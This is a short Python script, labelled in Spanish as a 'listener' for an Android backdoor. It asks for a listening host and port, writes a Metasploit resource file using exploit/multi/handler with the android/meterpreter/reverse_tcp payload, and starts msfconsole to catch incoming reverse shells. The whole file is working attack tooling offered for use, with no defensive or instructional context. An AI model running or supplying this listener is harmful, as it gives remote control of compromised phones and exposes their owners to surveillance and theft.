import os 
def listener():
	print("""
	Listener para  Backdoor Android
		""")
	sel = raw_input("Para configurar el listener presione 1:")
	if(sel=="1"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('escuchador.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload android/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/escuchador.rc') 
	